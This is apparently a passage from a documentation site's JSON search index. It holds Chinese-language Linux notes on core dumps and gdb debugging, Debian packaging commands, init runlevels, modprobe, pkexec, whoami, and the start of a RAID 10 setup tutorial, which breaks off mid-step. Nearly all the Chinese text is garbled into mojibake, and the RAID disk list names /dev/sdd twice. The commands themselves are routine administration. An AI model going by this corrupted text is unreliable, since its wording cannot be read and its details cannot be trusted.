è¿™ä¸ªæ–‡ä»¶ä¾¿æ˜¯æ“ä½œç³»ç»ŸæŠŠç¨‹åºdownæ‰æ—¶çš„å†…å­˜å†…å®¹æ‰”å‡ºæ¥ç”Ÿæˆçš„, å®ƒå¯ä»¥åšä¸ºè°ƒè¯•ç¨‹åºçš„å‚è€ƒ ç”ŸæˆCoreæ–‡ä»¶ ä¸€èˆ¬é»˜è®¤æƒ…å†µä¸‹ï¼Œcore fileçš„å¤§å°è¢«è®¾ç½®ä¸ºäº†0ï¼Œè¿™æ ·ç³»ç»Ÿå°±ä¸dumpå‡ºcore fileäº†ã€‚ä¿®æ”¹åæ‰èƒ½ç”Ÿæˆcoreæ–‡ä»¶: #è®¾ç½®coreå¤§å°ä¸ºæ— é™ ulimit -c unlimited #è®¾ç½®æ–‡ä»¶å¤§å°ä¸ºæ— é™ ulimit unlimited è¿™äº›éœ€è¦æœ‰rootæƒé™, åœ¨ubuntuä¸‹æ¯æ¬¡é‡æ–°æ‰“å¼€ä¸­æ–­éƒ½éœ€è¦é‡æ–°è¾“å…¥ä¸Šé¢çš„ç¬¬ä¸€æ¡å‘½ä»¤, æ¥è®¾ç½®coreå¤§å°ä¸ºæ— é™ coreæ–‡ä»¶ç”Ÿæˆè·¯å¾„ è¾“å…¥å¯æ‰§è¡Œæ–‡ä»¶è¿è¡Œå‘½ä»¤çš„åŒä¸€è·¯å¾„ä¸‹ã€‚ è‹¥ç³»ç»Ÿç”Ÿæˆçš„coreæ–‡ä»¶ä¸å¸¦å…¶ä»–ä»»ä½•æ‰©å±•åç§°ï¼Œåˆ™å…¨éƒ¨å‘½åä¸ºcoreã€‚æ–°çš„coreæ–‡ä»¶ç”Ÿæˆå°†è¦†ç›–åŸæ¥çš„coreæ–‡ä»¶ã€‚ /proc/sys/kernel/core_uses_pidå¯ä»¥æ§åˆ¶coreæ–‡ä»¶çš„æ–‡ä»¶åä¸­æ˜¯å¦æ·»åŠ pidä½œä¸ºæ‰©å±•ã€‚ æ–‡ä»¶å†…å®¹ä¸º1ï¼Œè¡¨ç¤ºæ·»åŠ pidä½œä¸ºæ‰©å±•åï¼Œç”Ÿæˆçš„coreæ–‡ä»¶æ ¼å¼ä¸ºcore.xxxxï¼›ä¸º0åˆ™è¡¨ç¤ºç”Ÿæˆçš„coreæ–‡ä»¶åŒä¸€å‘½åä¸ºcoreã€‚ å¯é€šè¿‡ä»¥ä¸‹å‘½ä»¤ä¿®æ”¹æ­¤æ–‡ä»¶: echo \"1\" > /proc/sys/kernel/core_uses_pid proc/sys/kernel/core_patternå¯ä»¥æ§åˆ¶coreæ–‡ä»¶ä¿å­˜ä½ç½®å’Œæ–‡ä»¶åæ ¼å¼ã€‚ å¯é€šè¿‡ä»¥ä¸‹å‘½ä»¤ä¿®æ”¹æ­¤æ–‡ä»¶: echo \"/corefile/core-%e-%p-%t\" > core_pattern å¯ä»¥å°†coreæ–‡ä»¶ç»Ÿä¸€ç”Ÿæˆåˆ°/corefileç›®å½•ä¸‹ï¼Œäº§ç”Ÿçš„æ–‡ä»¶åä¸ºcore-å‘½ä»¤å-pid-æ—¶é—´æˆ³ ä»¥ä¸‹æ˜¯å‚æ•°åˆ—è¡¨: %p - insert pid into filename æ·»åŠ pid %u - insert current uid into filename æ·»åŠ å½“å‰uid %g - insert current gid into filename æ·»åŠ å½“å‰gid %s - insert signal that caused the coredump into the filename æ·»åŠ å¯¼è‡´äº§ç”Ÿcoreçš„ä¿¡å· %t - insert UNIX time that the coredump occurred into filename æ·»åŠ coreæ–‡ä»¶ç”Ÿæˆæ—¶çš„unixæ—¶é—´ %h - insert hostname where the coredump happened into filename æ·»åŠ ä¸»æœºå %e - insert coredumping executable name into filename æ·»åŠ å‘½ä»¤å ç”¨gdbæŸ¥çœ‹coreæ–‡ä»¶ å‘ç”Ÿcore dumpä¹‹å, ç”¨gdbè¿›è¡ŒæŸ¥çœ‹coreæ–‡ä»¶çš„å†…å®¹, ä»¥å®šä½æ–‡ä»¶ä¸­å¼•å‘core dumpçš„è¡Œ: gdb [exec file] [core file] å¦‚: gdb ./test core # æˆ–gdb ./a.out core-file core.xxxx gdbå, ç”¨btå‘½ä»¤backtraceæˆ–whereæŸ¥çœ‹ç¨‹åºè¿è¡Œåˆ°å“ªé‡Œ, æ¥å®šä½core dumpçš„æ–‡ä»¶->è¡Œ. å¾…è°ƒè¯•çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œåœ¨ç¼–è¯‘çš„æ—¶å€™éœ€è¦åŠ -gï¼Œcoreæ–‡ä»¶æ‰èƒ½æ­£å¸¸æ˜¾ç¤ºå‡ºé”™ä¿¡æ¯: gdb -core=core.xxxx file ./a.out bt gdb -c core.xxxx file ./a.out bt ç”¨gdbå®æ—¶è§‚å¯ŸæŸè¿›ç¨‹crashä¿¡æ¯ å¯åŠ¨è¿›ç¨‹: gdb -p PID c è¿è¡Œè¿›ç¨‹è‡³crash gdbä¼šæ˜¾ç¤ºcrashä¿¡æ¯: bt æ€»ç»“ä¸ºä¸¤ç§æƒ…å†µ è¿›ç¨‹æ„å¤–æ­»äº¡æˆ–è€…å´©æºƒï¼Œåœ¨å¯¹ core çš„é™åˆ¶ä¸ä¸º0çš„æƒ…å†µä¸‹å¯å‘ç”Ÿ core dump ç”Ÿæˆ core æ–‡ä»¶ å¦‚éœ€å¯¹å½“æ—¶çš„æƒ…å†µè¿›è¡Œæ’æŸ¥ï¼Œåˆ™éœ€æ‰§è¡Œ: gdb execfile corefile è·Ÿè¸ªå·²ç»å­˜åœ¨çš„ä¸€ä¸ªpidè¿›è¡Œè°ƒè¯•ç›´è‡³è¯¥pidå´©æºƒ code: gdb -p pid Pythonä½¿ç”¨gdbè°ƒè¯• å¯åŠ¨æœ‰ä¸¤ç§æ–¹å¼ 1ã€äº¤äº’å¼: $ gdb python ... (gdb) run <programname>.py <arguments> 2ã€è‡ªåŠ¨: $ gdb -ex r --args python <programname>.py <arguments> è°ƒè¯•: bt #æŸ¥çœ‹cè°ƒç”¨å †æ ˆ py-by #æŸ¥çœ‹pythonè°ƒç”¨æ ˆ info threads #ç›¸å…³çº¿ç¨‹ä¿¡æ¯ py-list #æŸ¥çœ‹pythonä»£ç è¿è¡Œåˆ°å“ªé‡Œ thread apply all py-list #æŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹çš„pyhtonä»£ç ä½ç½® python gdb extensionåœ¨gdbçš„ç¯å¢ƒä¸‹æä¾›äº†å¦‚ä¸‹å‡ ä¸ªpyå‘½ä»¤: py-list æŸ¥çœ‹å½“å‰pythonåº”ç”¨ç¨‹åºä¸Šä¸‹æ–‡ py-bt æŸ¥çœ‹å½“å‰pythonåº”ç”¨ç¨‹åºè°ƒç”¨å †æ ˆ py-bt-full æŸ¥çœ‹å½“å‰pythonåº”ç”¨ç¨‹åºè°ƒç”¨å †æ ˆï¼Œå¹¶ä¸”æ˜¾ç¤ºæ¯ä¸ªframeçš„è¯¦ç»†æƒ…å†µ py-print æŸ¥çœ‹pythonå˜é‡ py-locals æŸ¥çœ‹å½“å‰çš„scopeçš„å˜é‡ py-up æŸ¥çœ‹ä¸Šä¸€ä¸ªframe py-down æŸ¥çœ‹ä¸‹ä¸€ä¸ªframe","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-GDB.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-GDB.html"},{"title":"debbuild","text":"debå®Œæ•´æ„å»ºå¯å‚è€ƒ: /docs/æ“ä½œç³»ç»Ÿ/linux/æ•™ç¨‹/æœ¬åœ°æ„å»ºdebåŒ… debåŒ…éœ€è¦çš„ç›®å½•ç»“æ„æ„å»ºå¥½å (å¯ä½¿ç”¨ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/debmake æ¥æ„å»ºç›®å½•ç»“æ„), é€šè¿‡æ­¤å‘½ä»¤æ¥æ„å»ºå®Œæ•´çš„debåŒ…. debbuild è¯»å–è½¯ä»¶åŒ…çš„æºä»£ç ç›®å½•ä¸­çš„ debian/rules` æ–‡ä»¶æ¥æ‰§è¡Œæ„å»ºè¿‡ç¨‹ï¼Œ å¹¶è‡ªåŠ¨å¤„ç†æ„å»ºè¿‡ç¨‹ä¸­çš„è®¸å¤šæ­¥éª¤ï¼Œä¾‹å¦‚é…ç½®ã€ç¼–è¯‘å’Œå®‰è£…. debuild è¿˜ä¼šæ£€æŸ¥æ„å»ºä¾èµ–å…³ç³»å¹¶ç¡®ä¿å®ƒä»¬å·²æ»¡è¶³ï¼Œä»¥åŠç”Ÿæˆç¬¦åˆ Debian è½¯ä»¶åŒ…è§„èŒƒçš„äºŒè¿›åˆ¶å’Œæºä»£ç è½¯ä»¶åŒ…. ç›¸å¯¹è€Œè¨€ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/dpkg æ›´åº•å±‚ä¸€ç‚¹, åªéœ€è¦ç¼–è¯‘å¥½çš„ä»£ç ä¸ç›®å½•ç»“æ„å³å¯.","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-debbuild.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-debbuild.html"},{"title":"debmake","text":"éœ€è¦æ„å»º debian çš„è½¯ä»¶åŒ…(debåŒ…)æ—¶, å¯é€šè¿‡æ­¤å‘½ä»¤è‡ªåŠ¨ç”Ÿæˆéœ€è¦çš„debç›®å½•ç»“æ„. debåŒ…æ„å»ºå¯å‚è€ƒ: /docs/æ“ä½œç³»ç»Ÿ/linux/æ•™ç¨‹/æœ¬åœ°æ„å»ºdebåŒ… ä¸€èˆ¬ä¸ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/debbuild ä¸€èµ·ä½¿ç”¨, å¦‚: $ tar -xzmf debhello-0.0.tar.gz $ cd debhello-0.0 $ debmake ... manual customization $ debuild ...","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-debmake.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-debmake.html"},{"title":"init","text":"è¿™æ¶‰åŠåˆ° /docs/æ“ä½œç³»ç»Ÿ/linux/æ¦‚å¿µæ€§/Linuxç³»ç»Ÿçš„å¯åŠ¨è¿‡ç¨‹ æ”¯æŒçš„å‚æ•°: 0 å…³æœº 1 å•ç”¨æˆ·çŠ¶æ€(root) 2 å¤šç”¨æˆ·çŠ¶æ€(æ— NFS, å³ä¸èƒ½ä½¿ç”¨net file system, ä¸è”ç½‘) 3 å¤šç”¨æˆ·çŠ¶æ€(æœ‰NFS, æ ‡å‡†çš„è¿è¡Œçº§) 4 ä¿ç•™, æœªä½¿ç”¨ 5 è¿›å…¥GUIå›¾å½¢ç•Œé¢(X11ã€xwindow) 6 é‡å¯ init è¿›ç¨‹æ˜¯ç³»ç»Ÿæ‰€æœ‰è¿›ç¨‹çš„èµ·ç‚¹ï¼Œå¯ä»¥æŠŠå®ƒæ¯”æ‹Ÿæˆç³»ç»Ÿæ‰€æœ‰è¿›ç¨‹çš„è€ç¥–å®—ï¼Œæ²¡æœ‰è¿™ä¸ªè¿›ç¨‹ï¼Œç³»ç»Ÿä¸­ä»»ä½•è¿›ç¨‹éƒ½ä¸ä¼šå¯åŠ¨ã€‚ init ç¨‹åºé¦–å…ˆæ˜¯éœ€è¦è¯»å–é…ç½®æ–‡ä»¶ /etc/inittab(æ ¹æ®ä½¿ç”¨æœºåˆ¶çš„ä¸åŒè¯»å–ä¸é€šçš„é…ç½®æ–‡ä»¶, æ¯”å¦‚Ubuntuä½¿ç”¨çš„æ˜¯Upstartæœºåˆ¶, ç›¸å…³é…ç½®æ–‡ä»¶ä¸º/etc/init/rc-sysinit.conf) è¿è¡Œçº§åˆ« è®¸å¤šç¨‹åºéœ€è¦å¼€æœºå¯åŠ¨ã€‚å®ƒä»¬åœ¨Windowså«åš\"æœåŠ¡\"ï¼ˆserviceï¼‰ï¼Œåœ¨Linuxå°±å«åš\"å®ˆæŠ¤è¿›ç¨‹\"ï¼ˆdaemonï¼‰ã€‚ initè¿›ç¨‹çš„ä¸€å¤§ä»»åŠ¡ï¼Œå°±æ˜¯å»è¿è¡Œè¿™äº›å¼€æœºå¯åŠ¨çš„ç¨‹åºã€‚ ä½†æ˜¯ï¼Œä¸åŒçš„åœºåˆéœ€è¦å¯åŠ¨ä¸åŒçš„ç¨‹åºï¼Œæ¯”å¦‚ç”¨ä½œæœåŠ¡å™¨æ—¶ï¼Œéœ€è¦å¯åŠ¨Apacheï¼Œç”¨ä½œæ¡Œé¢å°±ä¸éœ€è¦ã€‚ Linuxå…è®¸ä¸ºä¸åŒçš„åœºåˆï¼Œåˆ†é…ä¸åŒçš„å¼€æœºå¯åŠ¨ç¨‹åºï¼Œè¿™å°±å«åš\"è¿è¡Œçº§åˆ«\"ï¼ˆrunlevelï¼‰ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯åŠ¨æ—¶æ ¹æ®\"è¿è¡Œçº§åˆ«\"ï¼Œç¡®å®šè¦è¿è¡Œå“ªäº›ç¨‹åºã€‚ æŸ¥çœ‹å½“å‰è¿è¡Œçº§åˆ«å¯ä½¿ç”¨ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/runlevel Linuxç³»ç»Ÿæœ‰7ä¸ªè¿è¡Œçº§åˆ«(runlevel), ä¹Ÿå°±æ˜¯initæŒ‡ä»¤æ”¯æŒçš„å‚æ•°ï¼š è¿è¡Œçº§åˆ«0ï¼šç³»ç»ŸåœæœºçŠ¶æ€ï¼Œç³»ç»Ÿé»˜è®¤è¿è¡Œçº§åˆ«ä¸èƒ½è®¾ä¸º0ï¼Œå¦åˆ™ä¸èƒ½æ­£å¸¸å¯åŠ¨ è¿è¡Œçº§åˆ«1ï¼šå•ç”¨æˆ·å·¥ä½œçŠ¶æ€ï¼Œrootæƒé™ï¼Œç”¨äºç³»ç»Ÿç»´æŠ¤ï¼Œç¦æ­¢è¿œç¨‹ç™»å½• è¿è¡Œçº§åˆ«2ï¼šå¤šç”¨æˆ·çŠ¶æ€(æ²¡æœ‰NFS) è¿è¡Œçº§åˆ«3ï¼šå®Œå…¨çš„å¤šç”¨æˆ·çŠ¶æ€(æœ‰NFS)ï¼Œç™»å½•åè¿›å…¥æ§åˆ¶å°å‘½ä»¤è¡Œæ¨¡å¼ è¿è¡Œçº§åˆ«4ï¼šç³»ç»Ÿæœªä½¿ç”¨ï¼Œä¿ç•™ è¿è¡Œçº§åˆ«5ï¼šX11æ§åˆ¶å°ï¼Œç™»å½•åè¿›å…¥å›¾å½¢GUIæ¨¡å¼ è¿è¡Œçº§åˆ«6ï¼šç³»ç»Ÿæ­£å¸¸å…³é—­å¹¶é‡å¯ï¼Œé»˜è®¤è¿è¡Œçº§åˆ«ä¸èƒ½è®¾ä¸º6ï¼Œå¦åˆ™ä¸èƒ½æ­£å¸¸å¯åŠ¨ ç³»ç»Ÿåˆå§‹åŒ– åœ¨initçš„é…ç½®æ–‡ä»¶ä¸­æœ‰è¿™ä¹ˆä¸€è¡Œ: si::sysinit:/etc/rc.d/rc.sysinit å®ƒè°ƒç”¨æ‰§è¡Œäº†/etc/rc.d/rc.sysinitï¼Œè€Œrc.sysinitæ˜¯ä¸€ä¸ªbash shellçš„è„šæœ¬ï¼Œ å®ƒä¸»è¦æ˜¯å®Œæˆä¸€äº›ç³»ç»Ÿåˆå§‹åŒ–çš„å·¥ä½œï¼Œrc.sysinitæ˜¯æ¯ä¸€ä¸ªè¿è¡Œçº§åˆ«éƒ½è¦é¦–å…ˆè¿è¡Œçš„é‡è¦è„šæœ¬ã€‚ å®ƒä¸»è¦å®Œæˆçš„å·¥ä½œæœ‰: æ¿€æ´»äº¤æ¢åˆ†åŒº æ£€æŸ¥ç£ç›˜ åŠ è½½ç¡¬ä»¶æ¨¡å— ä¸€äº›éœ€è¦ä¼˜å…ˆæ‰§è¡Œä»»åŠ¡ã€‚ å¦‚ä¸‹é¢çš„å†…å®¹: l5:5:wait:/etc/rc.d/rc 5 è¡¨ç¤ºä»¥5ä¸ºå‚æ•°è¿è¡Œ/etc/rc.d/rcï¼Œ/etc/rc.d/rcæ˜¯ä¸€ä¸ªShellè„šæœ¬ï¼Œå®ƒæ¥å—5ä½œä¸ºå‚æ•°ï¼Œ å»æ‰§è¡Œ/etc/rc.d/rc5.d/ç›®å½•ä¸‹çš„æ‰€æœ‰çš„rcå¯åŠ¨è„šæœ¬ï¼Œ/etc/rc.d/rc5.d/ç›®å½•ä¸­çš„è¿™äº›å¯åŠ¨è„šæœ¬å®é™…ä¸Šéƒ½æ˜¯ä¸€äº›è¿æ¥æ–‡ä»¶ï¼Œ è€Œä¸æ˜¯çœŸæ­£çš„rcå¯åŠ¨è„šæœ¬ï¼ŒçœŸæ­£çš„rcå¯åŠ¨è„šæœ¬å®é™…ä¸Šéƒ½æ˜¯æ”¾åœ¨/etc/rc.d/init.d/ç›®å½•ä¸‹ã€‚ è€Œè¿™äº›rcå¯åŠ¨è„šæœ¬æœ‰ç€ç±»ä¼¼çš„ç”¨æ³•ï¼Œå®ƒä»¬ä¸€èˆ¬èƒ½æ¥å—startã€stopã€restartã€statusç­‰å‚æ•°ã€‚ /etc/rc.d/rc5.d/ä¸­çš„rcå¯åŠ¨è„šæœ¬é€šå¸¸æ˜¯Kæˆ–Så¼€å¤´çš„è¿æ¥æ–‡ä»¶ï¼Œå¯¹äºä»¥ S å¼€å¤´çš„å¯åŠ¨è„šæœ¬ï¼Œå°†ä»¥startå‚æ•°æ¥è¿è¡Œã€‚ è€Œå¦‚æœå‘ç°å­˜åœ¨ç›¸åº”çš„è„šæœ¬ä¹Ÿå­˜åœ¨Kæ‰“å¤´çš„è¿æ¥ï¼Œè€Œä¸”å·²ç»å¤„äºè¿è¡Œæ€äº†(ä»¥/var/lock/subsys/ä¸‹çš„æ–‡ä»¶ä½œä¸ºæ ‡å¿—)ï¼Œ åˆ™å°†é¦–å…ˆä»¥stopä¸ºå‚æ•°åœæ­¢è¿™äº›å·²ç»å¯åŠ¨äº†çš„å®ˆæŠ¤è¿›ç¨‹ï¼Œç„¶åå†é‡æ–°è¿è¡Œã€‚ è¿™æ ·åšæ˜¯ä¸ºäº†ä¿è¯æ˜¯å½“initæ”¹å˜è¿è¡Œçº§åˆ«æ—¶ï¼Œæ‰€æœ‰ç›¸å…³çš„å®ˆæŠ¤è¿›ç¨‹éƒ½å°†é‡å¯ã€‚ è‡³äºåœ¨æ¯ä¸ªè¿è¡Œçº§ä¸­å°†è¿è¡Œå“ªäº›å®ˆæŠ¤è¿›ç¨‹ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡chkconfigæˆ–setupä¸­çš„\"System Services\"æ¥è‡ªè¡Œè®¾å®šã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-init.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-init.html"},{"title":"modprobe","text":"å†…æ ¸æ¨¡å—å¯è§: /docs/æ“ä½œç³»ç»Ÿ/linux/ç³»ç»ŸæœåŠ¡/å†…æ ¸æ¨¡å— -a , --all è½½å…¥å…¨éƒ¨çš„æ¨¡å—ã€‚ -c , --show-conf æ˜¾ç¤ºæ‰€æœ‰æ¨¡å—çš„è®¾ç½®ä¿¡æ¯ã€‚ -d , --debug ä½¿ç”¨æ’é”™æ¨¡å¼ã€‚ -l , --list æ˜¾ç¤ºå¯ç”¨çš„æ¨¡å—ã€‚ -r , --remove è‹¥åœ¨å‘½ä»¤æŒ‡å®šæ¨¡å—,åˆ™åˆ é™¤æŒ‡å®šæ¨¡å—,å¦åˆ™,æŒ‡å®š\"è‡ªåŠ¨æ¸…é™¤\"æ¨¡å¼ -t , --type æŒ‡å®šæ¨¡å—ç±»å‹ã€‚ -v , --verbose æ‰§è¡Œæ—¶æ˜¾ç¤ºè¯¦ç»†çš„ä¿¡æ¯ã€‚ -V , --version æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚ -h elp æ˜¾ç¤ºå¸®åŠ©ã€‚ -C , --configconfig file æŒ‡å®šé…ç½®æ–‡ä»¶.é»˜è®¤ä½¿ç”¨/etc/modules.confæ–‡ä»¶ä¸ºé…ç½®æ–‡ä»¶ -c åˆ—å‡ºç›®å‰ç³»ç»Ÿæ‰€æœ‰çš„æ¨¡ç»„ï¼(æ›´è¯¦ç»†çš„ä»£å·å¯¹åº”è¡¨) -l åˆ—å‡ºç›®å‰åœ¨/lib/modules/ uname-r /kernelå½“ä¸­çš„æ‰€æœ‰æ¨¡ç»„å®Œæ•´æ¡£åï¼› -f å¼ºåˆ¶è½½å…¥è¯¥æ¨¡ç»„ï¼› -r ç±»ä¼¼ rmmod ï¼Œå°±æ˜¯ç§»é™¤æŸä¸ªæ¨¡ç»„å•°ï½","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-modprobe.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-modprobe.html"},{"title":"pkexec","text":"linuxæ¡Œé¢ç³»ç»Ÿä¸‹ç”³è¯·ææƒæŒ‡ä»¤, æ˜¯ä¸€ä¸ªç”¨äºLinuxçš„é€šç”¨å·¥å…·ï¼Œ å®ƒå¹¶ä¸é™äºç‰¹å®šçš„æ¡Œé¢ç¯å¢ƒ. å¯åœ¨å¤šä¸ªæ¡Œé¢ç³»ç»Ÿä¸­ä½¿ç”¨ï¼ŒåŒ…æ‹¬ä½†ä¸é™äº: GNOME KDE Plasma Xfce LXQt Cinnamon MATE ç”¨æ³•: pkexec [--user username] <éœ€è¦ææƒçš„æŒ‡ä»¤/ç¨‹åº> [å‚æ•°åˆ—è¡¨] ç‰¹åˆ«è¯´æ˜, pkexecæ‰§è¡Œè„šæœ¬æ—¶, è™½ç„¶å¯èƒ½ä¼šä¸€å¼€å§‹æœ‰ DISPLAY , ä½†æ˜¯ä½¿ç”¨bashæ‰§è¡Œè„šæœ¬æ—¶, ä¸ä¼šè‡ªåŠ¨å°† DISPLAY è¿™ä¸ªç¯å¢ƒå˜é‡ç»™è¯»è¿›å», å¦‚: pkexec bash xxx.sh xxx.sh è„šæœ¬å†…è·å–çš„ DISPLAY ä¸ºç©º, è¯¦è§ /docs/æ“ä½œç³»ç»Ÿ/linux/Linuxç¯å¢ƒå˜é‡/DISPLAY","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-pkexec.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-pkexec.html"},{"title":"whoami","text":"æŸ¥çœ‹æ­£åœ¨ä½¿ç”¨çš„ç”¨æˆ·","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-whoami.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-whoami.html"},{"title":"è®¾ç½® RAID 10 æˆ– 1 + 0 (åµŒå¥—)","text":"å‚è€ƒ:: ä½œè€…: Babin Lonston è¯‘è€…: LCTT è¯‘è€…: struggling < https://linux.cn/portal.php?mod=comment&id=6122&idtype=aid >`_ RAID 10 æ˜¯ç»„åˆ RAID 1 å’Œ RAID 0 å½¢æˆçš„ã€‚ è¦è®¾ç½® RAID 10ï¼Œæˆ‘ä»¬è‡³å°‘éœ€è¦4ä¸ªç£ç›˜ã€‚ åœ¨ä¹‹å‰çš„æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬å·²ç»çœ‹åˆ°äº†å¦‚ä½•ä½¿ç”¨æœ€å°‘ä¸¤ä¸ªç£ç›˜è®¾ç½® RAID 1 å’Œ RAID 0ã€‚ åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å°†ä½¿ç”¨æœ€å°‘4ä¸ªç£ç›˜ç»„åˆ RAID 1 å’Œ RAID 0 æ¥è®¾ç½® RAID 10ã€‚ å‡è®¾æˆ‘ä»¬å·²ç»åœ¨ç”¨ RAID 10 åˆ›å»ºçš„é€»è¾‘å·ä¿å­˜äº†ä¸€äº›æ•°æ®ã€‚ æ¯”å¦‚æˆ‘ä»¬è¦ä¿å­˜æ•°æ® \"TECMINT\"ï¼Œå®ƒå°†ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•å°†å…¶ä¿å­˜åœ¨4ä¸ªç£ç›˜ä¸­ã€‚ åœ¨ Linux ä¸­åˆ›å»º Raid 10ï¼ˆLCTT è¯‘æ³¨ï¼šåŸå›¾æœ‰è¯¯ï¼Œå·²ä¿®æ­£ï¼‰ RAID 10 æ˜¯å…ˆåšé•œåƒï¼Œå†åšæ¡å¸¦ã€‚ å› æ­¤ï¼Œåœ¨ RAID 1 ä¸­ï¼Œç›¸åŒçš„æ•°æ®å°†è¢«å†™å…¥åˆ°ä¸¤ä¸ªç£ç›˜ä¸­ï¼Œ\"T\"å°†åŒæ—¶è¢«å†™å…¥åˆ°ç¬¬ä¸€å’Œç¬¬äºŒä¸ªç£ç›˜ä¸­ã€‚ æ¥ç€çš„æ•°æ®è¢«æ¡å¸¦åŒ–åˆ°å¦å¤–ä¸¤ä¸ªç£ç›˜ï¼Œ\"E\"å°†è¢«åŒæ—¶å†™å…¥åˆ°ç¬¬ä¸‰å’Œç¬¬å››ä¸ªç£ç›˜ä¸­ã€‚ å®ƒå°†ç»§ç»­å¾ªç¯æ­¤è¿‡ç¨‹ï¼Œ\"C\"å°†åŒæ—¶è¢«å†™å…¥åˆ°ç¬¬ä¸€å’Œç¬¬äºŒä¸ªç£ç›˜ï¼Œä»¥æ­¤ç±»æ¨ã€‚ æ³¨è§£ ï¼ˆLCTT è¯‘æ³¨ï¼šåŸæ–‡ä¸­æ­¤å¤„æè¿°æ··æ·†æœ‰è¯¯ï¼Œå·²ç»æ ¹æ®å®é™…æƒ…å†µè¿›è¡Œä¿®æ”¹ã€‚ï¼‰ ç°åœ¨ä½ å·²ç»äº†è§£ RAID 10 æ€æ ·ç»„åˆ RAID 1 å’Œ RAID 0 æ¥å·¥ä½œçš„äº†ã€‚ å¦‚æœæˆ‘ä»¬æœ‰4ä¸ª20 GB çš„ç£ç›˜ï¼Œæ€»å…±ä¸º 80 GBï¼Œä½†æˆ‘ä»¬å°†åªèƒ½å¾—åˆ°40 GB çš„å®¹é‡ï¼Œå¦ä¸€åŠçš„å®¹é‡åœ¨æ„å»º RAID 10 ä¸­ä¸¢å¤±ã€‚ RAID 10 çš„ä¼˜ç‚¹å’Œç¼ºç‚¹ æä¾›æ›´å¥½çš„æ€§èƒ½ã€‚ åœ¨ RAID 10 ä¸­æˆ‘ä»¬å°†å¤±å»ä¸€åŠçš„ç£ç›˜å®¹é‡ã€‚ è¯»ä¸å†™çš„æ€§èƒ½éƒ½å¾ˆå¥½ï¼Œå› ä¸ºå®ƒä¼šåŒæ—¶è¿›è¡Œå†™å…¥å’Œè¯»å–ã€‚ å®ƒèƒ½è§£å†³æ•°æ®åº“çš„é«˜ I/O ç£ç›˜å†™æ“ä½œã€‚ è¦æ±‚ åœ¨ RAID 10 ä¸­ï¼Œæˆ‘ä»¬è‡³å°‘éœ€è¦4ä¸ªç£ç›˜ï¼Œå‰2ä¸ªç£ç›˜ä¸º RAID 1ï¼Œå…¶ä»–2ä¸ªç£ç›˜ä¸º RAID 0ï¼Œ å°±åƒæˆ‘ä¹‹å‰è¯´çš„ï¼ŒRAID 10 ä»…ä»…æ˜¯ç»„åˆäº† RAID 0å’Œ1ã€‚ å¦‚æœæˆ‘ä»¬éœ€è¦æ‰©å±• RAID ç»„ï¼Œæœ€å°‘éœ€è¦æ·»åŠ 4ä¸ªç£ç›˜ã€‚ æœåŠ¡å™¨è®¾ç½®: æ“ä½œç³»ç»Ÿ : CentOS 6.5 FinalIP åœ°å€ : 192.168.0.229 ä¸»æœºå : rd10.tecmintlocal.com ç£ç›˜ 1 [20GB] : /dev/sdd ç£ç›˜ 2 [20GB] : /dev/sdc ç£ç›˜ 3 [20GB] : /dev/sdd ç£ç›˜ 4 [20GB] : /dev/sde æœ‰ä¸¤ç§æ–¹æ³•æ¥è®¾ç½® RAID 10ï¼Œåœ¨è¿™é‡Œä¸¤ç§æ–¹æ³•æˆ‘éƒ½ä¼šæ¼”ç¤ºï¼Œä½†æˆ‘æ›´å–œæ¬¢ç¬¬ä¸€ç§æ–¹æ³•ï¼Œä½¿ç”¨å®ƒæ¥è®¾ç½® RAID 10 æ›´ç®€å•ã€‚ æ–¹æ³•1ï¼šè®¾ç½® RAID 10 é¦–å…ˆï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç¡®è®¤æ‰€æ·»åŠ çš„4å—ç£ç›˜æ²¡æœ‰è¢«ä½¿ç”¨: ls -l /dev | grep sd å››ä¸ªç£ç›˜è¢«æ£€æµ‹åï¼Œç„¶åæ¥æ£€æŸ¥ç£ç›˜æ˜¯å¦å­˜åœ¨ RAID åˆ†åŒº: mdadm -E /dev/sd[b-e]### mdadm --examine /dev/sdb /dev/sdc /dev/sdd /dev/sde ### æˆ– éªŒè¯æ·»åŠ çš„4å—ç£ç›˜ æ³¨è§£ åœ¨ä¸Šé¢çš„è¾“å‡ºä¸­ï¼Œå¦‚æœæ²¡æœ‰æ£€æµ‹åˆ° super-block æ„å‘³ç€åœ¨4å—ç£ç›˜ä¸­æ²¡æœ‰å®šä¹‰è¿‡ RAIDã€‚ ç¬¬1æ­¥ï¼šä¸º RAID åˆ†åŒº, ç°åœ¨ï¼Œä½¿ç”¨ fdisk ï¼Œå‘½ä»¤ä¸º4ä¸ªç£ç›˜(/dev/sdb, 